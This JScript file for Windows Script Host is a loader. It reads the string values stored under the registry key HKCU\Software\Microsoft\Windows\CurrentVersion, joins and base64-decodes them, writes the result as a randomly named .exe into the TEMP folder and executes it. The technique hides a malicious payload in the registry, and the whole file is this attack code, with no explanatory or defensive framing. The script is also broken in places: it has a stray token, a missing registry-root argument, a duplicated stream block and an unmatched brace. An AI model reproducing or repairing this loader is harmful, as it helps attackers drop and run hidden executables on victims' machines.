var base64={};
base64.PADCHAR='=';
base64.ALPHA='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
base64.makeDOMException=function(){
  var e,tmp;
  try{
    return new DOMException(DOMException.INVALID_CHARACTER_ERR)}
    catch(tmp){
      var ex=new Error('DOM Exception 5');
      ex.code=ex.number=5;
      ex.name=ex.description='INVALID_CHARACTER_ERR';
      ex.toString=function(){
        return'Error: '+ex.name+': '+ex.message};
      return ex}};

base64.getbyte64=function(s,i){
  var idx=base64.ALPHA.indexOf(s.charAt(i));
  if(idx===-1){
    throw base64.makeDOMException();}
  return idx};

base64.decode=function(s){
  s=''+s;var getbyte64=base64.getbyte64;
  var pads,i,b10;
  var imax=s.length;
  if(imax===0){
    return s}
  if(imax%4!==0){
    throw base64.makeDOMException();}
  pads=0;
  if(s.charAt(imax-1)===base64.PADCHAR){
    pads=1;
    if(s.charAt(imax-2)===base64.PADCHAR){
      pads=2}
    imax-=4}
  var x=[];
  for(i=0;i<imax;i+=4){
    b10=(getbyte64(s,i)<<18)|(getbyte64(s,i+1)<<12)|(getbyte64(s,i+2)<<6)|getbyte64(s,i+3);
    x.push(String.fromCharCode(b10>>16,(b10>>8)&0xff,b10&0xff))}
  switch(pads){
    case 1:
      b10=(getbyte64(s,i)<<18)|(getbyte64(s,i+1)<<12)|(getbyte64(s,i+2)<<6);
      x.push(String.fromCharCode(b10>>16,(b10>>8)&0xff));
      break;
    case 2:
      b10=(getbyte64(s,i)<<18)|(getbyte64(s,i+1)<<12);
      x.push(String.fromCharCode(b10>>16));
      break}
  return x.join('')};

base64.getbyte=function(s,i){
  var x=s.charCodeAt(i);
  if(x>255){
    throw base64.makeDOMException();}
  return x};

function randstring(min,max){
    var text = "";
    var char = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
  var len = Math.floor(Math.random()*(max-min+1)+min)
    for( var i=0; i < len; i++ )
        text += char.charAt(Math.floor(Math.random() * char.length));
char
    return text;
}

function regGetChildValues(strComputer, regRoot, strRegPath){
  try{
    var aNames=[];var aTypes=[];
    var objLocator=new ActiveXObject("WbemScripting.SWbemLocator");
    var objService=objLocator.ConnectServer(strComputer, "root\\default");
    var objReg=objService.Get("StdRegProv");
    var objMethod=objReg.Methods_.Item("EnumValues");
    var objInParam=objMethod.InParameters.SpawnInstance_();
    objInParam.hDefKey=regRoot;
      objInParam.sSubKeyName=strRegPath;
      var objOutParam=objReg.ExecMethod_(objMethod.Name, objInParam);
      switch(objOutParam.ReturnValue){
        case 0:
          aNames=(objOutParam.sNames!=null)?objOutParam.sNames.toArray():null;
          aTypes=(objOutParam.Types!=null)?objOutParam.Types.toArray():null;
          break;
        case 2:
          aNames.length=0;break;}}
  catch(e){
    ShowMessage('ERROR: '+e.number+' '+e.description,msiMessageTypeInfo);
    return{Results:0,Names:null,Types:null };}
  return{Results:aNames.length,Names:aNames,Types:aTypes};}

var HKEY_CURRENT_USER=0x80000001;
var HKEY_LOCAL_MACHINE=0x80000002;
var regkey='SOFTWARE\\Microsoft\\Windows\\CurrentVersion';
var machine_name='.'
var Values=regGetChildValues(machine_name, /*HKEY_CURRENT_USER*/, regkey);
if(Values.Results==0){
  WScript.Echo('No instances were found!');}
else{
  var WshShell=new ActiveXObject("WScript.Shell");

  var key_value;
  var key_value_cat;
  for(i=0;i<Values.Results;i++){
    if(Values.Types[i]==1){
      key_value=WshShell.RegRead('HKCU\\'+regkey+'\\'+Values.Names[i]);
      key_value_cat+=key_value;}}
  key_value_cat=key_value_cat.replace('undefined','');
  key_value_cat=base64.decode(key_value_cat);

  var stream=new ActiveXObject("ADODB.Stream");
  stream.Type=2;
  stream.Charset="ISO-8859-1";
  stream.Open();
  stream.WriteText(key_value_cat);
  var temp = WshShell.ExpandEnvironmentStrings("%TEMP%");
  var min=6;
  var max=12;
  var tempfile = temp+'\\'+randstring(min,max)+'.exe';
  var stream=new ActiveXObject("ADODB.Stream");
  stream.Type=2;
  stream.Charset="ISO-8859-1";
  stream.Open();
  stream.WriteText(key_value_cat);
  stream.SaveToFile(tempfile,2);
  stream.Close();
  var run=new ActiveXObject('WSCRIPT.Shell').Run(tempfile);}
}
